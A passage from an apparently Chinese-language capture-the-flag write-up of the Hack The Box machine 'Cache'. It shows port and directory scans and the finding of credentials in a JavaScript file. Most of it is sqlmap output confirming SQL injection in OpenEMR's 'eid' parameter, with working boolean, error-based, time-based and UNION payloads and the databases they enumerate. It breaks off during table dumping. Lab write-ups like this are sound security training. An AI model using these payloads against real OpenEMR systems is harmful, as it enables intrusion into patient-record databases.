    <content type="html"><![CDATA[<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00.概述"></a>0x00.概述</h2><img src="/2020/10/01/HTB-cache/image-20201001085152007.png" class><a id="more"></a><h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01.信息收集"></a>0x01.信息收集</h2><p><code>仅仅开放了22/80端口</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# nmap -sC -sV -sT 10.10.10.188 -oN nmap.CVT</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-01 05:02 EDT</span><br><span class="line">Nmap scan report for 10.10.10.188</span><br><span class="line">Host is up (0.37s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a9:2d:b2:a0:c4:57:e7:7c:35:2d:45:4d:db:80:8c:f1 (RSA)</span><br><span class="line">|   256 bc:e4:16:3d:2a:59:a1:3a:6a:09:28:dd:36:10:38:08 (ECDSA)</span><br><span class="line">|_  256 57:d5:47:ee:07:ca:3a:c0:fd:9b:a8:7f:6b:4c:9d:7c (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Cache</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 54.34 seconds</span><br><span class="line">root@JIYE:~/htb/cache#</span><br></pre></td></tr></table></figure><h2 id="0x02-先访问80端口"><a href="#0x02-先访问80端口" class="headerlink" title="0x02.先访问80端口"></a>0x02.先访问80端口</h2><h3 id="1-可以看到这是一个介绍hacker的网站"><a href="#1-可以看到这是一个介绍hacker的网站" class="headerlink" title="1.可以看到这是一个介绍hacker的网站"></a>1.可以看到这是一个介绍hacker的网站</h3><img src="/2020/10/01/HTB-cache/image-20201001091003205.png" class><h3 id="2-点击author发现作者是ASH"><a href="#2-点击author发现作者是ASH" class="headerlink" title="2.点击author发现作者是ASH"></a>2.点击author发现作者是ASH</h3><img src="/2020/10/01/HTB-cache/image-20201001091126076.png" class><h3 id="3-尝试使用弱口令登入，返回结果为网站正在建设中"><a href="#3-尝试使用弱口令登入，返回结果为网站正在建设中" class="headerlink" title="3.尝试使用弱口令登入，返回结果为网站正在建设中"></a>3.尝试使用弱口令登入，返回结果为网站正在建设中</h3><img src="/2020/10/01/HTB-cache/image-20201001092153303.png" class><h3 id="4-发现功能js文件，点击审查"><a href="#4-发现功能js文件，点击审查" class="headerlink" title="4.发现功能js文件，点击审查"></a>4.发现功能js文件，点击审查</h3><img src="/2020/10/01/HTB-cache/image-20201001092439634.png" class><h3 id="5-发现用户名与密码"><a href="#5-发现用户名与密码" class="headerlink" title="5.发现用户名与密码"></a>5.发现用户名与密码</h3><img src="/2020/10/01/HTB-cache/image-20201001092533720.png" class><h2 id="0x03-登入"><a href="#0x03-登入" class="headerlink" title="0x03.登入"></a>0x03.登入</h2><p><code>返回结果依然是正在建设中</code></p><img src="/2020/10/01/HTB-cache/image-20201001092716509.png" class><h2 id="0x04-修改hosts文件"><a href="#0x04-修改hosts文件" class="headerlink" title="0x04.修改hosts文件"></a>0x04.修改hosts文件</h2><h3 id="1-前面提示查看ASH的其他项目例如HMS，所以添加一条记录"><a href="#1-前面提示查看ASH的其他项目例如HMS，所以添加一条记录" class="headerlink" title="1.前面提示查看ASH的其他项目例如HMS，所以添加一条记录"></a>1.前面提示查看ASH的其他项目例如HMS，所以添加一条记录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.10.188    hms.htb</span><br></pre></td></tr></table></figure><h3 id="2-访问hms-htb"><a href="#2-访问hms-htb" class="headerlink" title="2.访问hms.htb"></a>2.访问hms.htb</h3><p><code>尝试ash登入，但登入失败，CMS为OpenEmr</code></p><img src="/2020/10/01/HTB-cache/image-20201001151531806.png" class><h2 id="0x05-扫描hms-htb"><a href="#0x05-扫描hms-htb" class="headerlink" title="0x05.扫描hms.htb"></a>0x05.扫描hms.htb</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~# dirb http://hms.htb</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Thu Oct  1 08:38:25 2020</span><br><span class="line">URL_BASE: http://hms.htb/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://hms.htb/ ----</span><br><span class="line">+ http://hms.htb/admin.php (CODE:200|SIZE:937)                                       </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/common/                                               </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/config/                                               </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/contrib/                                               </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/controllers/                                           </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/custom/                                               </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/images/                                              </span><br><span class="line">+ http://hms.htb/index.php (CODE:302|SIZE:0)                                         </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/interface/                                             </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/javascript/                                           </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/library/                                               </span><br><span class="line">+ http://hms.htb/LICENSE (CODE:200|SIZE:35147)                                       </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/modules/                                               </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/portal/                                               </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/public/                                               </span><br><span class="line">+ http://hms.htb/server-status (CODE:403|SIZE:272)                                   </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/services/                                             </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/sites/                                                 </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/sql/                                                   </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/templates/                                            </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/tests/                                                 </span><br><span class="line">==&gt; DIRECTORY: http://hms.htb/vendor/</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h2 id="0x06-手动爬虫，发现protal目录"><a href="#0x06-手动爬虫，发现protal目录" class="headerlink" title="0x06.手动爬虫，发现protal目录"></a>0x06.手动爬虫，发现protal目录</h2><p><code>Goolge发现存在sql injection</code><span class="exturl" data-url="aHR0cHM6Ly92aWRlby5oYWNraW5nLnJldmlld3MvMjAxOC8wOC9vcGVuZW1yLXNpbXVsYXRlZC1hdHRhY2suaHRtbA==">地址<i class="fa fa-external-link-alt"></i></span></p><img src="/2020/10/01/HTB-cache/image-20201001154929030.png" class><img src="/2020/10/01/HTB-cache/image-20201001154952482.png" class><img src="/2020/10/01/HTB-cache/image-20201001155008570.png" class><h2 id="0x07-抓包"><a href="#0x07-抓包" class="headerlink" title="0x07.抓包"></a>0x07.抓包</h2><img src="/2020/10/01/HTB-cache/image-20201001155148152.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1</span><br><span class="line">Host: hms.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: OpenEMR=00b20ha34nukojgrtj0mvigfrk; PHPSESSID=ogdqnggoo752nheh5upb7qo5mo</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><h2 id="0x08-sqlmap利用"><a href="#0x08-sqlmap利用" class="headerlink" title="0x08.sqlmap利用"></a>0x08.sqlmap利用</h2><h3 id="1-得到数据库openemr"><a href="#1-得到数据库openemr" class="headerlink" title="1.得到数据库openemr"></a>1.得到数据库openemr</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/htb/cache# cat bp</span><br><span class="line">GET /portal/add_edit_event_user.php?eid=1 HTTP/1.1</span><br><span class="line">Host: hms.htb</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: OpenEMR=00b20ha34nukojgrtj0mvigfrk; PHPSESSID=ogdqnggoo752nheh5upb7qo5mo</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">root@JIYE:~/htb/cache# sqlmap -r bp --dbs --batch</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[,]_____ ___ ___  &#123;1.4.9#stable&#125;</span><br><span class="line">|_ -| . [(]     | .&#x27;| . |</span><br><span class="line">|___|_  [.]_|_|_|__,|  _|</span><br><span class="line">      |_|V...       |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&#x27;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting @ 09:53:26 /2020-10-01/</span><br><span class="line"></span><br><span class="line">[09:53:26] [INFO] parsing HTTP request from &#x27;bp&#x27;</span><br><span class="line">[09:53:26] [INFO] testing connection to the target URL</span><br><span class="line">[09:53:27] [WARNING] there is a DBMS error found in the HTTP response body which could interfere with the results of the tests</span><br><span class="line">[09:53:27] [INFO] checking if the target is protected by some kind of WAF/IPS</span><br><span class="line">[09:53:28] [INFO] testing if the target URL content is stable</span><br><span class="line">[09:53:29] [INFO] target URL content is stable</span><br><span class="line">[09:53:29] [INFO] testing if GET parameter &#x27;eid&#x27; is dynamic</span><br><span class="line">[09:53:29] [WARNING] GET parameter &#x27;eid&#x27; does not appear to be dynamic</span><br><span class="line">[09:53:30] [INFO] heuristic (basic) test shows that GET parameter &#x27;eid&#x27; might be injectable (possible DBMS: &#x27;MySQL&#x27;)</span><br><span class="line">[09:53:30] [INFO] testing for SQL injection on GET parameter &#x27;eid&#x27;</span><br><span class="line">it looks like the back-end DBMS is &#x27;MySQL&#x27;. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y</span><br><span class="line">for the remaining tests, do you want to include all tests for &#x27;MySQL&#x27; extending provided level (1) and risk (1) values? [Y/n] Y</span><br><span class="line">[09:53:30] [INFO] testing &#x27;AND boolean-based blind - WHERE or HAVING clause&#x27;</span><br><span class="line">[09:53:30] [WARNING] reflective value(s) found and filtering out</span><br><span class="line">[09:53:34] [INFO] testing &#x27;Boolean-based blind - Parameter replace (original value)&#x27;</span><br><span class="line">[09:53:35] [INFO] GET parameter &#x27;eid&#x27; appears to be &#x27;Boolean-based blind - Parameter replace (original value)&#x27; injectable (with --not-string=&quot;row&quot;)</span><br><span class="line">[09:53:35] [INFO] testing &#x27;Generic inline queries&#x27;</span><br><span class="line">[09:53:35] [INFO] testing &#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)&#x27;</span><br><span class="line">[09:53:35] [INFO] testing &#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)&#x27;</span><br><span class="line">[09:53:36] [INFO] testing &#x27;MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)&#x27;</span><br><span class="line">[09:53:36] [INFO] testing &#x27;MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (EXP)&#x27;</span><br><span class="line">[09:53:36] [INFO] testing &#x27;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#x27;</span><br><span class="line">[09:53:37] [INFO] GET parameter &#x27;eid&#x27; is &#x27;MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)&#x27; injectable </span><br><span class="line">[09:53:37] [INFO] testing &#x27;MySQL inline queries&#x27;</span><br><span class="line">[09:53:37] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (comment)&#x27;</span><br><span class="line">[09:53:37] [WARNING] time-based comparison requires larger statistical model, please wait....... (done)                                                     </span><br><span class="line">[09:53:40] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries&#x27;</span><br><span class="line">[09:53:40] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP - comment)&#x27;</span><br><span class="line">[09:53:41] [INFO] testing &#x27;MySQL &gt;= 5.0.12 stacked queries (query SLEEP)&#x27;</span><br><span class="line">[09:53:42] [INFO] testing &#x27;MySQL &lt; 5.0.12 stacked queries (heavy query - comment)&#x27;</span><br><span class="line">[09:53:42] [INFO] testing &#x27;MySQL &lt; 5.0.12 stacked queries (heavy query)&#x27;</span><br><span class="line">[09:53:43] [INFO] testing &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27;</span><br><span class="line">[09:53:54] [INFO] GET parameter &#x27;eid&#x27; appears to be &#x27;MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)&#x27; injectable </span><br><span class="line">[09:53:54] [INFO] testing &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27;</span><br><span class="line">[09:53:54] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span><br><span class="line">[09:53:55] [INFO] &#x27;ORDER BY&#x27; technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test</span><br><span class="line">[09:53:56] [INFO] target URL appears to have 4 columns in query</span><br><span class="line">[09:53:57] [INFO] GET parameter &#x27;eid&#x27; is &#x27;Generic UNION query (NULL) - 1 to 20 columns&#x27; injectable</span><br><span class="line">GET parameter &#x27;eid&#x27; is vulnerable. Do you want to keep testing the others (if any)? [y/N] N</span><br><span class="line">sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: eid (GET)</span><br><span class="line">    Type: boolean-based blind</span><br><span class="line">    Title: Boolean-based blind - Parameter replace (original value)</span><br><span class="line">    Payload: eid=(SELECT (CASE WHEN (5601=5601) THEN 1 ELSE (SELECT 8979 UNION SELECT 9885) END))</span><br><span class="line"></span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)</span><br><span class="line">    Payload: eid=1 AND GTID_SUBSET(CONCAT(0x716b6a6271,(SELECT (ELT(4116=4116,1))),0x7170767071),4116)</span><br><span class="line"></span><br><span class="line">    Type: time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: eid=1 AND (SELECT 8798 FROM (SELECT(SLEEP(5)))lAMe)</span><br><span class="line"></span><br><span class="line">    Type: UNION query</span><br><span class="line">    Title: Generic UNION query (NULL) - 4 columns</span><br><span class="line">    Payload: eid=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716b6a6271,0x4f434469514a6974484d5673426553635173764565766e4448467a77536e44577473487571474973,0x7170767071),NULL-- -</span><br><span class="line">---</span><br><span class="line">[09:53:57] [INFO] the back-end DBMS is MySQL</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.6</span><br><span class="line">[09:53:59] [INFO] fetching database names</span><br><span class="line">[09:54:00] [INFO] retrieved: &#x27;information_schema&#x27;</span><br><span class="line">[09:54:00] [INFO] retrieved: &#x27;openemr&#x27;</span><br><span class="line">available databases [2]:                                                                                                                                    </span><br><span class="line">[*] information_schema</span><br><span class="line">[*] openemr</span><br><span class="line"></span><br><span class="line">[09:54:00] [INFO] fetched data logged to text files under &#x27;/root/.local/share/sqlmap/output/hms.htb&#x27;</span><br><span class="line"></span><br><span class="line">[*] ending @ 09:54:00 /2020-10-01/</span><br><span class="line"></span><br><span class="line">root@JIYE:~/htb/cache#</span><br></pre></td></tr></table></figure><h3 id="2-爆表"><a href="#2-爆表" class="headerlink" title="2.爆表"></a>2.爆表</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span 